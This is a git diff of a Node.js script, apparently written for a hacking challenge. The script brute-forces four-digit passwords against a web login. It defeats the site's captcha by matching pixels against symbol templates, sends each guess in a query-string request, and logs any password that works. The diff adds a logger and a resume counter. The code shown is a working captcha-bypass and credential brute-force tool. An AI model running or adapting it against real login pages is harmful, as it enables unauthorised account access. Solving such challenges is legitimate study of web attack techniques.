@@ -7,6 +7,7 @@ const ndarrayPack = require("ndarray-pack");
 const ndarrayUnpack = require("ndarray-unpack");
 const getPixels = require('get-pixels');
 const savePixels = require('save-pixels');
+const logger = require("../../../utils/logger");
 
 const ICONS = "./src/defis/kakawouette/bruteforcecaptcha/ICONS_SYMBOL_sm.png";
 // const LETTERS = "./src/defis/kakawouette/bruteforcecaptcha/letters.jpg";
@@ -48,7 +49,7 @@ const letters = [
 let PASSWORD_COUNT = 0;
 let PASSWORD_BASE = 5000;
 let bascule = 1;
-let count = 0;
+let count = 4195;
 
 function tryLogin(captcha,login,password){
     fetch(`${URL}validate_login?captcha=${captcha}&login=${login}&password=${password}`).then(function(response) {
@@ -56,20 +57,21 @@ function tryLogin(captcha,login,password){
     })
     .then(function(text) {
         if(text.includes('Login / Pass erroné redskull')){
+            const withoutBeforeP = text.substring(text.indexOf('<p align="center">'),text.indexOf('</p>'));
             PASSWORD_COUNT = PASSWORD_BASE + (count*bascule);
             if(bascule>0) {
                 count++;
             }
             bascule = bascule *(-1);
-            console.log(password);
+            logger.info(password, withoutBeforeP);
             bruteForce();
         }else {
-            console.log(text);
-            console.log("GOOD PASSWORD ",password);
+            logger.info(text);
+            logger.info("GOOD PASSWORD ",password);
         }
     })
     .catch(function(error) {
-        console.log('Request failed', error)
+        logger.info('Request failed', error)
         bruteForce();
     });
 }
@@ -121,7 +123,7 @@ function resolveCaptcha(path,login,password){
 
             //Should be found now
             const captchaWord = word.reduce((a, b) => a+b);
-            // console.log(captchaWord);
+            // logger.info(captchaWord);
 
             tryLogin(captchaWord,login,password);
 
@@ -186,7 +188,7 @@ function base64_decode(base64str, file) {
     var bitmap = new Buffer(base64str, 'base64');
     // write buffer to file
     fs.writeFileSync(file, bitmap);
-    // console.log('******** File created from base64 encoded string ********');
+    // logger.info('******** File created from base64 encoded string ********');
     return bitmap;
 }
 
@@ -206,7 +208,7 @@ function bruteForce() {
             resolveCaptcha("./src/defis/kakawouette/bruteforcecaptcha/debug/captcha.png", LOGIN, String("0000" + PASSWORD_COUNT).slice(-4));
         })
         .catch(function (error) {
-            console.log('Request failed', error)
+            logger.info('Request failed', error)
             bruteForce();
         });
 }
